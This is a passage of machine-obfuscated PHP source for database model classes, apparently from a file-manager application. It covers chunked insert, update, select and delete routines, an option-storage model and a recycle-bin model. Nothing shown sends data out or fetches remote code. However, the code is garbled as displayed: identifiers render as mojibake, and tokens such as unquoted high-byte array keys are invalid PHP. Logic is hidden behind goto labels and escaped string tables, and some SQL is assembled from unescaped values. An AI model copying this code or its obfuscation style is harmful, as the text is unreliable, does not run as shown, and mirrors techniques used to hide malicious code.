$eåƒòŞ÷ëˆ[326]: case $eåƒòŞ÷ëˆ[327]: $AŒê·Õ¸ï¡ = isset($EªÚ¿Š¬•[4]) ? (array) $EªÚ¿Š¬•[4] : array(); array_unshift($AŒê·Õ¸ï¡, $eŠš®³»´[$bÕ•ÚÍ…¶]); if ($eåƒòŞ÷ëˆ[326] == $EªÚ¿Š¬•[3]) { $eŠš®³»´[$bÕ•ÚÍ…¶] = call_user_func_array($EªÚ¿Š¬•[1], $AŒê·Õ¸ï¡); } else { $eŠš®³»´[$bÕ•ÚÍ…¶] = call_user_func_array(array(&$this, $EªÚ¿Š¬•[1]), $AŒê·Õ¸ï¡); } break; case $eåƒòŞ÷ëˆ[278]: $eŠš®³»´[$bÕ•ÚÍ…¶] = $eŠš®³»´[$EªÚ¿Š¬•[1]]; break; case $eåƒòŞ÷ëˆ[299]: $BÂ‘Ú·ÈÉ = $eŠš®³»´[$bÕ•ÚÍ…¶]; $eŠš®³»´[$bÕ•ÚÍ…¶] = json_decode($BÂ‘Ú·ÈÉ, !0); if (is_null($eŠš®³»´[$bÕ•ÚÍ…¶])) { $eŠš®³»´[$bÕ•ÚÍ…¶] = $BÂ‘Ú·ÈÉ; } break; case $eåƒòŞ÷ëˆ[328]: if ($eŠš®³»´[$bÕ•ÚÍ…¶] === $eåƒòŞ÷ëˆ[43]) { unset($eŠš®³»´[$bÕ•ÚÍ…¶]); } break; case $eåƒòŞ÷ëˆ[329]: $eŠš®³»´[$bÕ•ÚÍ…¶] = $EªÚ¿Š¬•[1]; default: break; } } } public function saveAll($B‹Ğğ‘èÊ) { goto a¦êã¿ìÔ; FÙ«ãµøĞ: $this->chunkEventSet(); goto e’‰îİ¨; b‡’¯×—Ù: $E¬Ñ¨‘Ùéã = array(); $añ©œÎõÔ = count($B‹Ğğ‘èÊ); for ($b¯ˆö†¡¹Ö = 0; $b¯ˆö†¡¹Ö < $añ©œÎõÔ; $b¯ˆö†¡¹Ö++) { $DŸğˆôÒÓŒ = $B‹Ğğ‘èÊ[$b¯ˆö†¡¹Ö]; if (!is_array($DŸğˆôÒÓŒ) || count($DŸğˆôÒÓŒ) != 4) { continue; } $EÒÑ‰Š¢¤ = "\125\x50\x44\x41\124\105\x20\x60{$AƒšËˆÓ—³}\140\40\123\x45\124\40{$DŸğˆôÒÓŒ[2]}\40\75\40\103\x41\123\105\x20{$DŸğˆôÒÓŒ[0]}\x20\xa"; if ($AƒŞŠÍˆÔá == 0) { $D—§ÅÁ‡÷¨ = $EÒÑ‰Š¢¤; } $E¬Ñ¨‘Ùéã[] = $B³²Œ„õã[125] . $DŸğˆôÒÓŒ[1] . $B³²Œ„õã[125]; $AƒŞŠÍˆÔá++; $D—§ÅÁ‡÷¨ .= "\40\127\110\105\116\x20\47{$DŸğˆôÒÓŒ[1]}\x27\40\x54\x48\x45\x4e\40\x27{$DŸğˆôÒÓŒ[3]}\x27\40\xa"; if ($AƒŞŠÍˆÔá == $E¢Š¯·ÕŠÊ || $b¯ˆö†¡¹Ö == $añ©œÎõÔ - 1) { goto aÅçÚ´ğØµ; aÅçÚ´ğØµ: $fäè×Ô¯ğ = implode($B³²Œ„õã[57], $E¬Ñ¨‘Ùéã); $D—§ÅÁ‡÷¨ .= "\40\x45\116\104\x20\x20\127\x48\105\122\105\40{$DŸğˆôÒÓŒ[0]}\40\111\x4e\40\50{$fäè×Ô¯ğ}\x29\x20"; $this->execute($D—§ÅÁ‡÷¨); goto aÁğ—Ä’Üâ; d½Ç©òÜçª: $E¬Ñ¨‘Ùéã = array(); goto BìŞ¸¨ĞÊ˜; aÁğ—Ä’Üâ: $AƒŞŠÍˆÔá = 0; $D—§ÅÁ‡÷¨ = $EÒÑ‰Š¢¤; $this->chunkEventCheck(count($E¬Ñ¨‘Ùéã)); goto d½Ç©òÜçª; BìŞ¸¨ĞÊ˜: } } goto FÙ«ãµøĞ; bÚä­¹½ùè: $B‹Ğğ‘èÊ = is_array($B‹Ğğ‘èÊ) ? $B‹Ğğ‘èÊ : array(); $D—§ÅÁ‡÷¨ = $B³²Œ„õã[382]; $AƒŞŠÍˆÔá = 0; goto b‡’¯×—Ù; a¦êã¿ìÔ: $B³²Œ„õã =& $_SERVER[¾÷]; $AƒšËˆÓ—³ = $this->tablePrefix . $this->tableName; $E¢Š¯·ÕŠÊ = self::SQL_WHERE_IN_CHUNK; goto bÚä­¹½ùè; e’‰îİ¨: } public function saveAllEach($FšÓ¸‹Ã) { $aíÄÖÅÙáÖ =& $_SERVER[¾÷]; $D¼‡…î‘æ = $this->tablePrefix . $this->tableName; foreach ($FšÓ¸‹Ã as $d‡­â²Ú§î) { if (!is_array($d‡­â²Ú§î) || count($d‡­â²Ú§î) != 4) { continue; } $aĞã ‰ùªó = $d‡­â²Ú§î[0] . $aíÄÖÅÙáÖ[383] . $d‡­â²Ú§î[1] . $aíÄÖÅÙáÖ[125]; $eİ  ÒèË… = $d‡­â²Ú§î[2] . $aíÄÖÅÙáÖ[383] . $d‡­â²Ú§î[3] . $aíÄÖÅÙáÖ[125]; $C‰”éêÆŞÔ = "\165\x70\x64\x61\164\145\x20{$D¼‡…î‘æ}\x20\163\x65\164\40{$eİ  ÒèË…}\40\167\x68\x65\x72\145\x20{$aĞã ‰ùªó}\x3b"; $this->execute($C‰”éêÆŞÔ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($BºÅ’êé”ƒ = false, $a§‰•“¼ä = false) { $this->_chunkEvent = $BºÅ’êé”ƒ; $this->_chunkEventParam = $a§‰•“¼ä; } private function chunkEventCheck($Eå‘òÕ‘è) { if (!$this->_chunkEvent) { return; } $Eì¡ñ‰ŸÑª = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $Eì¡ñ‰ŸÑª[$_SERVER[¾÷][384]] = $Eå‘òÕ‘è; Hook::trigger($this->_chunkEvent, $Eì¡ñ‰ŸÑª); } public function addAll($AŠí²ßÊŞ , $F³Î‘Š½Ÿ = array(), $B—ªÄ½Ù±ó = false) { goto A¤¢Ü¹Ã¨; A¤¢Ü¹Ã¨: $dÂ¦Æ¼· =& $_SERVER[¾÷]; ignore_timeout(); $B´ˆ°ÊŠ‡‚ = self::SQL_WHERE_IN_CHUNK; goto Bï®»—àè½; Bï®»—àè½: if (empty($AŠí²ßÊŞ )) { $this->error = think_lang($dÂ¦Æ¼·[276]); return !1; } $F³Î‘Š½Ÿ = $this->_parseOptions($F³Î‘Š½Ÿ); foreach ($AŠí²ßÊŞ  as $AŒš§ò¤š½ => $BÒÚ‡ÓÊ¼) { $AŠí²ßÊŞ [$AŒš§ò¤š½] = $this->_facade($BÒÚ‡ÓÊ¼); $this->_beforeInsert($AŠí²ßÊŞ [$AŒš§ò¤š½], $F³Î‘Š½Ÿ); } goto BËÀ³İà; BËÀ³İà: if (method_exists($this->db, $dÂ¦Æ¼·[277])) { for ($a»à…ÏÙÉ = 0; $a»à…ÏÙÉ < count($AŠí²ßÊŞ ); $a»à…ÏÙÉ += $B´ˆ°ÊŠ‡‚) { $açíÛ‹İÒò = array_slice($AŠí²ßÊŞ , $a»à…ÏÙÉ, $B´ˆ°ÊŠ‡‚); if (!is_array($açíÛ‹İÒò) || count($açíÛ‹İÒò) == 0) { break; } $FÒ¶ìÏ¹Î = $this->db->insertAll($açíÛ‹İÒò, $F³Î‘Š½Ÿ, $B—ªÄ½Ù±ó); $this->chunkEventCheck(count($açíÛ‹İÒò)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($AŠí²ßÊŞ  as $AŒš§ò¤š½ => $BÒÚ‡ÓÊ¼) { $FÒ¶ìÏ¹Î = $this->db->insert($BÒÚ‡ÓÊ¼, $F³Î‘Š½Ÿ, $B—ªÄ½Ù±ó); } $this->commit(); } if (!1 !== $FÒ¶ìÏ¹Î) { $DÏ•“êİ“® = $this->getLastInsID(); if ($DÏ•“êİ“®) { return $DÏ•“êİ“®; } } return $FÒ¶ìÏ¹Î; goto c¦”ççÑ£˜; c¦”ççÑ£˜: } public function save($c™ó³ĞÔ¯Ë = '', $EòÃ·Æ¶Æ® = array()) { goto a©˜ä•öŞ¼; cøº¤ƒŠ±: $dÄƒİÉ£Ãš = $a¹ØŠ‰ù´˜[$EùñÀÛñÈÈ[280]][$AÆÌî™º£][1]; $dÄƒİÉ£Ãš = is_array($dÄƒİÉ£Ãš) ? $dÄƒİÉ£Ãš : array(); $D¡¡À÷«á® = count($dÄƒİÉ£Ãš); goto C˜¯èä—Í; Dñ¢¡ºÑÚ: $AÆÌî™º£ = $this->findWhereField($a¹ØŠ‰ù´˜); if (!$AÆÌî™º£) { return parent::save($c™ó³ĞÔ¯Ë, $EòÃ·Æ¶Æ®); } $A²ŸÉ‚˜£ = 0; goto cøº¤ƒŠ±; a©˜ä•öŞ¼: $EùñÀÛñÈÈ =& $_SERVER[¾÷]; $F’„Æ¾Ó = self::SQL_WHERE_IN_CHUNK; $a¹ØŠ‰ù´˜ = $this->optionsValue(); goto Dñ¢¡ºÑÚ; C˜¯èä—Í: for ($d‹¾–Ç®Í = 0; $d‹¾–Ç®Í < $D¡¡À÷«á®; $d‹¾–Ç®Í += $F’„Æ¾Ó) { $Eº˜ñ¤Õ‰Ó = array_slice($dÄƒİÉ£Ãš, $d‹¾–Ç®Í, $F’„Æ¾Ó); if (!is_array($Eº˜ñ¤Õ‰Ó) || count($Eº˜ñ¤Õ‰Ó) == 0) { break; } $a¹ØŠ‰ù´˜[$EùñÀÛñÈÈ[280]][$AÆÌî™º£][1] = $Eº˜ñ¤Õ‰Ó; $this->optionsValue($a¹ØŠ‰ù´˜); $A²ŸÉ‚˜£ += parent::save($c™ó³ĞÔ¯Ë, $EòÃ·Æ¶Æ®); $this->chunkEventCheck(count($Eº˜ñ¤Õ‰Ó)); } $this->chunkEventSet(); return $A²ŸÉ‚˜£; goto D¢®²šê‚¨; D¢®²šê‚¨: } public function add($B¦†ÇŞ¸ª© = '', $f¥¨Åé‘Èå = array(), $dÌÖ“»Œ = false) { if ($this->addTaskStatus && is_array($B¦†ÇŞ¸ª©)) { $this->addTaskData[] = $B¦†ÇŞ¸ª©; return; } return parent::add($B¦†ÇŞ¸ª©, $f¥¨Åé‘Èå, $dÌÖ“»Œ); } public function parseWhereLike($D²Öš¥„ó±, $f•à½§”Öó = '', $Cƒ½¡Ì¦İ = false, &$añØñºåŠÑ = false) { goto aîÏç©Û»; BõŸëŞÅ: foreach ($D²Öš¥„ó± as $Eà•ôæÆ => $dàÛÄî®¶¡) { if (is_array($dàÛÄî®¶¡) && count($dàÛÄî®¶¡) == 2 && $dàÛÄî®¶¡[0] == $fæëâ‰š¶ê[387] && is_string($dàÛÄî®¶¡[1]) && substr($dàÛÄî®¶¡[1], 0, 1) == $fæëâ‰š¶ê[388] && substr($dàÛÄî®¶¡[1], strlen($dàÛÄî®¶¡[1]) - 1, 1) == $fæëâ‰š¶ê[388]) { goto A„Ø‹‘Á°™; aºŞòÕÂê: $AìÆäÕ¤ø = $this->db->escapeString($AìÆäÕ¤ø); if (!strpos($d¬˜ÄŸÆÏ, $fæëâ‰š¶ê[104])) { $d¬˜ÄŸÆÏ = $fæëâ‰š¶ê[389] . $d¬˜ÄŸÆÏ . $fæëâ‰š¶ê[389]; } if ($Bç«Ä×…³Ğ[$fæëâ‰š¶ê[390]]) { $AìÆäÕ¤ø = $fæëâ‰š¶ê[125] . $AìÆäÕ¤ø . $fæëâ‰š¶ê[125]; } goto BèË¼æ®¦¬; A„Ø‹‘Á°™: $añØñºåŠÑ = !0; $d¬˜ÄŸÆÏ = is_string($Eà•ôæÆ) ? $Eà•ôæÆ : $f•à½§”Öó; $AìÆäÕ¤ø = substr($dàÛÄî®¶¡[1], 1, strlen($dàÛÄî®¶¡[1]) - 2); goto aºŞòÕÂê; BèË¼æ®¦¬: $FÛ—´“å“•[$Bõæ°ôÄÆ] = $fæëâ‰š¶ê[391] . $d¬˜ÄŸÆÏ . $fæëâ‰š¶ê[392] . $AìÆäÕ¤ø . $fæëâ‰š¶ê[393]; $Bõæ°ôÄÆ++; continue; goto eµ‚êÎ—£; eµ‚êÎ—£: } if (is_array($dàÛÄî®¶¡)) { $f•à½§”Öó = is_string($Eà•ôæÆ) ? $Eà•ôæÆ : $f•à½§”Öó; $dàÛÄî®¶¡ = $this->parseWhereLike($dàÛÄî®¶¡, $f•à½§”Öó, !0, $añØñºåŠÑ); } if (is_numeric($Eà•ôæÆ)) { $FÛ—´“å“•[$Bõæ°ôÄÆ] = $dàÛÄî®¶¡; $Bõæ°ôÄÆ++; } else { $FÛ—´“å“•[$Eà•ôæÆ] = $dàÛÄî®¶¡; } } if ($añØñºåŠÑ && !$Cƒ½¡Ì¦İ) { trace_log(array($FÛ—´“å“•, $D²Öš¥„ó±), $fæëâ‰š¶ê[280]); } return $FÛ—´“å“•; goto CÊÂ¨×˜»à; fƒÔÊé÷Ÿ„: if (!is_array($D²Öš¥„ó±)) { return $D²Öš¥„ó±; } $FÛ—´“å“• = array(); $Bõæ°ôÄÆ = 0; goto BõŸëŞÅ; aîÏç©Û»: $fæëâ‰š¶ê =& $_SERVER[¾÷]; $Bç«Ä×…³Ğ = $GLOBALS[$fæëâ‰š¶ê[16]][$fæëâ‰š¶ê[385]]; if (!$Bç«Ä×…³Ğ[$fæëâ‰š¶ê[386]]) { return $D²Öš¥„ó±; } goto fƒÔÊé÷Ÿ„; CÊÂ¨×˜»à: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($AƒßòÀ“âÙ = array()) { goto DÛïğÈŠ¥; a‚¡‡Òô¡: return $cÉ¦–‹¡‚Ó; goto D×Òß»Š•…; døÑ¬ù‡ØŠ: $d®˜ññ× = $this->findWhereField($d¬é±±ø); if (!$d®˜ññ× || isset($d¬é±±ø[$Cì•ëñŞÁ[297]]) || isset($d¬é±±ø[$Cì•ëñŞÁ[358]])) { return parent::select($AƒßòÀ“âÙ); } $F“—øœÖİš = $d¬é±±ø[$Cì•ëñŞÁ[280]][$d®˜ññ×][1]; goto bÉ©é©Õ”; DÛïğÈŠ¥: $Cì•ëñŞÁ =& $_SERVER[¾÷]; $dç·­„Æ×Ö = self::SQL_WHERE_IN_CHUNK; $d¬é±±ø = $this->optionsValue(); goto døÑ¬ù‡ØŠ; bÉ©é©Õ”: $F“—øœÖİš = is_array($F“—øœÖİš) ? $F“—øœÖİš : array(); $cÉ¦–‹¡‚Ó = null; for ($Aî…—àİÔ¡ = 0; $Aî…—àİÔ¡ < count($F“—øœÖİš); $Aî…—àİÔ¡ += $dç·­„Æ×Ö) { $e°›Ä£è‹ã = array_slice($F“—øœÖİš, $Aî…—àİÔ¡, $dç·­„Æ×Ö); if (!is_array($e°›Ä£è‹ã) || count($e°›Ä£è‹ã) == 0) { break; } $d¬é±±ø[$Cì•ëñŞÁ[280]][$d®˜ññ×][1] = $e°›Ä£è‹ã; $this->optionsValue($d¬é±±ø); $FİßÂ³ƒÀá = parent::select($AƒßòÀ“âÙ); if (!$FİßÂ³ƒÀá) { continue; } if (is_null($cÉ¦–‹¡‚Ó)) { $cÉ¦–‹¡‚Ó = array(); } $cÉ¦–‹¡‚Ó = array_merge($cÉ¦–‹¡‚Ó, $FİßÂ³ƒÀá); } goto a‚¡‡Òô¡; D×Òß»Š•…: } public function delete($bƒ°Ü¼öîõ = array()) { goto c³š¶è¶ìç; Bî‚³®Ä‡©: return $Aº†×ëÑ®Ó; goto dŞ„ˆèƒ×; fàí¶÷Ü°‚: $añâ©Îë°ˆ = $this->findWhereField($Fªè÷Œ¾„Ñ); if (!$añâ©Îë°ˆ) { return parent::delete($bƒ°Ü¼öîõ); } $Aº†×ëÑ®Ó = 0; goto AÙ™»Ã×ó; c³š¶è¶ìç: $c‹«¯„ÙÑ´ =& $_SERVER[¾÷]; $FÂƒ„–ÚÇ¬ = self::SQL_WHERE_IN_CHUNK; $Fªè÷Œ¾„Ñ = $this->optionsValue(); goto fàí¶÷Ü°‚; AÙ™»Ã×ó: $Aïƒ¼İîˆš = $Fªè÷Œ¾„Ñ[$c‹«¯„ÙÑ´[280]][$añâ©Îë°ˆ][1]; $Aïƒ¼İîˆš = is_array($Aïƒ¼İîˆš) ? $Aïƒ¼İîˆš : array(); for ($C¡‹”‘ë‚· = 0; $C¡‹”‘ë‚· < count($Aïƒ¼İîˆš); $C¡‹”‘ë‚· += $FÂƒ„–ÚÇ¬) { $AÀÎÃá¼šì = array_slice($Aïƒ¼İîˆš, $C¡‹”‘ë‚·, $FÂƒ„–ÚÇ¬); if (!is_array($AÀÎÃá¼šì) || count($AÀÎÃá¼šì) == 0) { break; } $Fªè÷Œ¾„Ñ[$c‹«¯„ÙÑ´[280]][$añâ©Îë°ˆ][1] = $AÀÎÃá¼šì; $this->optionsValue($Fªè÷Œ¾„Ñ); $Aº†×ëÑ®Ó += parent::delete($bƒ°Ü¼öîõ); } goto Bî‚³®Ä‡©; dŞ„ˆèƒ×: } private function findWhereField($BÉÂã¦»¦‡) { $dö¹ÏŞÄ§ =& $_SERVER[¾÷]; $D”·¬¤æà² = self::SQL_WHERE_IN_CHUNK; if (!is_array($BÉÂã¦»¦‡) || !is_array($BÉÂã¦»¦‡[$dö¹ÏŞÄ§[280]])) { return !1; } foreach ($BÉÂã¦»¦‡[$dö¹ÏŞÄ§[280]] as $Eò‰¡‡é÷ => $CÜÔ¦ã‘Ï¼) { if (is_array($CÜÔ¦ã‘Ï¼) && isset($CÜÔ¦ã‘Ï¼[0]) && is_string($CÜÔ¦ã‘Ï¼[0]) && strtolower($CÜÔ¦ã‘Ï¼[0]) == $dö¹ÏŞÄ§[17] && is_array($CÜÔ¦ã‘Ï¼[1]) && count($CÜÔ¦ã‘Ï¼[1]) > $D”·¬¤æà²) { ignore_timeout(); return $Eò‰¡‡é÷; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\x73\x74\x65\x6d\x4f\x70\164\x69\157\156"; public $field = array(); public function listData($BªÊ´“ÈÌÓ = false, $DÓñƒŠÁ— = "\155\x6f\x64\x69\146\x79\x54\x69\x6d\x65", $FÙõƒìÖ¼° = false) { $Bî…ïå¼Ïê = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$Bî…ïå¼Ïê) { return $BªÊ´“ÈÌÓ ? null : array(); } if (!$BªÊ´“ÈÌÓ) { $Bî…ïå¼Ïê = array_filter(array_values($Bî…ïå¼Ïê)); return array_sort_by($Bî…ïå¼Ïê, $DÓñƒŠÁ—, $FÙõƒìÖ¼°); } return $Bî…ïå¼Ïê[$_SERVER[¾÷][394] . $BªÊ´“ÈÌÓ]; } public function insert($aåŞ£ßˆ÷Ä) { goto eá‹÷Ü›ã¹; eá‹÷Ü›ã¹: $c’–­Õ¸¼ =& $_SERVER[¾÷]; $aåŞ£ßˆ÷Ä = array_field_key($aåŞ£ßˆ÷Ä, $this->field); $Bç‚îçÆäƒ = Model($this->modelType)->get($c’–­Õ¸¼[395], $this->optionType . $c’–­Õ¸¼[396]); goto fˆ…—™˜‰”; E¥²šíøÀŸ: $aåŞ£ßˆ÷Ä[$c’–­Õ¸¼[93]] = time(); Model($this->modelType)->set($c’–­Õ¸¼[395], $Bç‚îçÆäƒ, $this->optionType . $c’–­Õ¸¼[396]); Model($this->modelType)->set($c’–­Õ¸¼[394] . $Bç‚îçÆäƒ, $aåŞ£ßˆ÷Ä, $this->optionType); goto eÜµË´ãù; fˆ…—™˜‰”: $Bç‚îçÆäƒ = $Bç‚îçÆäƒ ? $Bç‚îçÆäƒ : 0; $aåŞ£ßˆ÷Ä[$c’–­Õ¸¼[397]] = ++$Bç‚îçÆäƒ; $aåŞ£ßˆ÷Ä[$c’–­Õ¸¼[202]] = time(); goto E¥²šíøÀŸ; eÜµË´ãù: return $Bç‚îçÆäƒ; goto Fø·ã›­‹œ; Fø·ã›­‹œ: } public function update($a‚‰…¡¨Š¶, $b¹††·‡‡°) { goto c´ï ğ™¨; AÑª·Ô‰»Ó: if (!$BÖØ²Î¦„Ã) { return !1; } $b¹††·‡‡° = array_merge($BÖØ²Î¦„Ã, $b¹††·‡‡°); $b¹††·‡‡°[$dˆíª…çÀ¦[93]] = time(); goto D¯´«—Ì•±; D¯´«—Ì•±: return Model($this->modelType)->set($dˆíª…çÀ¦[394] . $a‚‰…¡¨Š¶, $b¹††·‡‡°, $this->optionType); goto AºÒ›—¡›; c´ï ğ™¨: $dˆíª…çÀ¦ =& $_SERVER[¾÷]; $b¹††·‡‡° = array_field_key($b¹††·‡‡°, $this->field); $BÖØ²Î¦„Ã = $this->listData($a‚‰…¡¨Š¶); goto AÑª·Ô‰»Ó; AºÒ›—¡›: } public function remove($Fáğ¤˜šŠè) { return Model($this->modelType)->remove($_SERVER[¾÷][394] . $Fáğ¤˜šŠè, $this->optionType); } public function clear() { $Eß°åŒ–Ï =& $_SERVER[¾÷]; Model($this->modelType)->remove($Eß°åŒ–Ï[395], $this->optionType . $Eß°åŒ–Ï[396]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($CØ¦Áèâñï, $FŠ‘Î¦éé¯) { if (!$FŠ‘Î¦éé¯) { return !1; } $b•¤©•ª¦­ = $this->listData(); $b•¤©•ª¦­ = array_to_keyvalue($b•¤©•ª¦­, $CØ¦Áèâñï); return isset($b•¤©•ª¦­[$FŠ‘Î¦éé¯]) ? $b•¤©•ª¦­[$FŠ‘Î¦éé¯] : !1; } public function findByName($d‚ÄÜÄ–ö) { return $this->findByKey($_SERVER[¾÷][38], $d‚ÄÜÄ–ö); } protected function resetData($FÅÑ»Şòë„) { $BÅ¨ºº×¾õ =& $_SERVER[¾÷]; $FÅÑ»Şòë„ = is_array($FÅÑ»Şòë„) ? $FÅÑ»Şòë„ : array(); $e¢× Ò°¡ = array(); for ($bÈÌèµÅ‹ = 0; $bÈÌèµÅ‹ < count($FÅÑ»Şòë„); $bÈÌèµÅ‹++) { $e¢× Ò°¡[$BÅ¨ºº×¾õ[394] . $FÅÑ»Şòë„[$bÈÌèµÅ‹][$BÅ¨ºº×¾õ[397]]] = $FÅÑ»Şòë„[$bÈÌèµÅ‹]; } return Model($this->modelType)->set($e¢× Ò°¡, !1, $this->optionType); } private function getAutoName($A°œ­Ø—‰Ó) { $D×½ˆåÇø¯ = array_to_keyvalue($this->listData(), $_SERVER[¾÷][38]); if (!$D×½ˆåÇø¯ || !isset($D×½ˆåÇø¯[$A°œ­Ø—‰Ó])) { return $A°œ­Ø—‰Ó; } for ($Bª»Ûç­’ = 1; $Bª»Ûç­’ < count($D×½ˆåÇø¯); $Bª»Ûç­’++) { $aé”£ãøğ = $A°œ­Ø—‰Ó . "\x28{$Bª»Ûç­’}\x29"; if (!isset($D×½ˆåÇø¯[$aé”£ãøğ])) { return $aé”£ãøğ; } } return $aé”£ãøğ; } } goto F¿âïïÏÒº; bƒõæ¯‚Ê: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\165\x72\143\145\137\x72\x65\x63\171\143\x6c\145"; protected $dataAuto = array(array("\x63\162\145\141\x74\x65\124\x69\x6d\x65", "\164\x69\x6d\x65", "\151\x6e\163\145\x72\x74", "\x66\165\156\x63\x74\x69\157\156")); public function listData($b¢÷ªÂœ = false) { $aÌíŞã×÷´ =& $_SERVER[¾÷]; $b¢÷ªÂœ = $b¢÷ªÂœ ? $b¢÷ªÂœ : USER_ID; $Bõ¶ Œ”õà = $this->where(array($aÌíŞã×÷´[1497] => $b¢÷ªÂœ))->select(); return array_to_keyvalue($Bõ¶ Œ”õà, $aÌíŞã×÷´[43], $aÌíŞã×÷´[399]); } public function moveToRecycle($Dƒ–„ˆÃÅĞ) { goto D·¸Š¦ä¨ğ; dñßõ÷‹ã: if (!$E“„”ŒÕ·¹ || $E“„”ŒÕ·¹[$A¾¢è—Õ×[426]] == $A¾¢è—Õ×[96]) { return; } $cÂº²“¼Šê = array($A¾¢è—Õ×[413] => $Dƒ–„ˆÃÅĞ, $A¾¢è—Õ×[1497] => USER_ID, $A¾¢è—Õ×[553] => $E“„”ŒÕ·¹[$A¾¢è—Õ×[407]], $A¾¢è—Õ×[554] => $E“„”ŒÕ·¹[$A¾¢è—Õ×[487]], $A¾¢è—Õ×[557] => $E“„”ŒÕ·¹[$A¾¢è—Õ×[490]]); $this->add($cÂº²“¼Šê); goto F‘ Ã–Œ÷í; D·¸Š¦ä¨ğ: $A¾¢è—Õ× =& $_SERVER[¾÷]; $D²½çÆÙ• = Model($A¾¢è—Õ×[1180]); $E“„”ŒÕ·¹ = $D²½çÆÙ•->sourceInfo($Dƒ–„ˆÃÅĞ); goto dñßõ÷‹ã; F‘ Ã–Œ÷í: $this->recycleMove($Dƒ–„ˆÃÅĞ, 1); if ($E“„”ŒÕ·¹[$A¾¢è—Õ×[406]] == $A¾¢è—Õ×[96]) { $CíìÀªóå = array($A¾¢è—Õ×[557] => array($A¾¢è—Õ×[516], $E“„”ŒÕ·¹[$A¾¢è—Õ×[490]] . $Dƒ–„ˆÃÅĞ . $A¾¢è—Õ×[517])); $D²½çÆÙ•->where($CíìÀªóå)->setField($A¾¢è—Õ×[426], 1); } goto c‹±éØÉİó; c‹±éØÉİó: } public function clear() { $this->remove(!1); } public function remove($CĞùŠ©ºÕã = false) { goto eŠçõ‰õİä; BÕÌğ¥¼›ñ: $CĞùŠ©ºÕã = $CĞùŠ©ºÕã === !1 ? !1 : $CĞùŠ©ºÕã; $Bæ¡ËƒæÍ = array(); foreach ($FÂğÎ‘ñÇ… as $A¹ƒ•¶Š¸) { if ($CĞùŠ©ºÕã != !1 && !in_array($A¹ƒ•¶Š¸, $CĞùŠ©ºÕã)) { continue; } $Bç„®—Ü©± = $b³ŞÜã„ë->sourceInfo($A¹ƒ•¶Š¸); $b³ŞÜã„ë->remove($A¹ƒ•¶Š¸, !1); $BÂ“Ç²†ƒ¨ = $Bç„®—Ü©±[$aˆ§ºîò°Ã[407]] . $aˆ§ºîò°Ã[80] . $Bç„®—Ü©±[$aˆ§ºîò°Ã[487]]; $Bæ¡ËƒæÍ[$BÂ“Ç²†ƒ¨] = array($aˆ§ºîò°Ã[553] => $Bç„®—Ü©±[$aˆ§ºîò°Ã[407]], $aˆ§ºîò°Ã[487] => $Bç„®—Ü©±[$aˆ§ºîò°Ã[487]]); $this->where(array($aˆ§ºîò°Ã[399] => $A¹ƒ•¶Š¸))->delete(); } goto cß˜÷¹òÆĞ; cß˜÷¹òÆĞ: foreach ($Bæ¡ËƒæÍ as $f×Ó²™ÔíÚ) { $b³ŞÜã„ë->targetSpaceUpdate($f×Ó²™ÔíÚ[$aˆ§ºîò°Ã[407]], $f×Ó²™ÔíÚ[$aˆ§ºîò°Ã[487]]); } goto F©ğÏæ‡ö; eŠçõ‰õİä: $aˆ§ºîò°Ã =& $_SERVER[¾÷]; $b³ŞÜã„ë = Model($aˆ§ºîò°Ã[1180]); $FÂğÎ‘ñÇ… = $this->listData(); goto BÕÌğ¥¼›ñ; F©ğÏæ‡ö: } public function restore($B‚ƒĞÊİ¤õ = false) { $CõçİŠ·Áˆ = $this->listData(); $this->_restoreSource($CõçİŠ·Áˆ, $B‚ƒĞÊİ¤õ); } public function restoreUserAll($F¤áß‡ì’) { $aÙ‘Ñİğ¸ª = $this->listData($F¤áß‡ì’); $this->_restoreSource($aÙ‘Ñİğ¸ª, !1); } private function _restoreSource($Dƒ‡Ï‚ÊéÔ, $b›”‰…ÂÚö) { goto fºµ‡õÙ™Ø; fºµ‡õÙ™Ø: $Dä½œºŸ =& $_SERVER[¾÷]; $a¥Â¡ƒÜ”’ = Model($Dä½œºŸ[1180]); $b›”‰…ÂÚö = $b›”‰…ÂÚö == !1 ? !1 : $b›”‰…ÂÚö; goto Dğ—ØİÖÀ; D‚ÕºôÄÅÛ: $a¥Â¡ƒÜ”’->updateModifyTime($dà‘øÕ­Óí); goto D¨ëâ„Šğ; Dğ—ØİÖÀ: if (!$Dƒ‡Ï‚ÊéÔ) { return !0; } $dà‘øÕ­Óí = array(); foreach ($Dƒ‡Ï‚ÊéÔ as $eª×ôÜäÁ©) { goto fÊä‡¬èÁ±; B— ´™š’›: $dà‘øÕ­Óí[] = $DÙšëğÄæ [$Dä½œºŸ[481]]; if ($DÙšëğÄæ [$Dä½œºŸ[406]] == $Dä½œºŸ[96]) { $dà‘øÕ­Óí[] = $eª×ôÜäÁ©; } $a¥Â¡ƒÜ”’->lockMoveEnd($eª×ôÜäÁ©); goto dì‹ñ´¢‘©; fÊä‡¬èÁ±: if ($b›”‰…ÂÚö != !1 && !in_array($eª×ôÜäÁ©, $b›”‰…ÂÚö)) { continue; } $DÙšëğÄæ  = $a¥Â¡ƒÜ”’->sourceInfo($eª×ôÜäÁ©); $BÆˆÜÂùì = $a¥Â¡ƒÜ”’->sourceInfo($DÙšëğÄæ [$Dä½œºŸ[481]]); goto C°““ÇäŒ; C°““ÇäŒ: if ($BÆˆÜÂùì[$Dä½œºŸ[426]] == $Dä½œºŸ[96]) { continue; } $a¥Â¡ƒÜ”’->lockMoveStart($eª×ôÜäÁ©); $this->recycleMove($eª×ôÜäÁ©, 0); goto eÄéğĞÑ“¾; eÄéğĞÑ“¾: if ($DÙšëğÄæ [$Dä½œºŸ[406]] == $Dä½œºŸ[96]) { $cÓ¢æ©œ´Š = array($Dä½œºŸ[557] => array($Dä½œºŸ[516], $DÙšëğÄæ [$Dä½œºŸ[490]] . $eª×ôÜäÁ© . $Dä½œºŸ[517])); 